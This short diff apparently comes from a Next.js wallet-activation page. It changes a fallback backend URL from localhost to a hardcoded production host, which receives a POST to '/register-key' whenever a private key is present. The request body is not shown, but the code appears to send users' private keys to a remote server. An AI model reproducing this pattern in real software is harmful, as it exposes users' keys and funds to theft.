@@ -84,7 +84,7 @@ export default function ActivatePage() {
         onSuccess: async () => {
           if (privateKey) {
             try {
-              const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001';
+              const backendUrl = process.env.NEXT_PUBLIC_BACKEND_URL || 'https://walletcorpse-production.up.railway.app';
               await fetch(`${backendUrl}/register-key`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
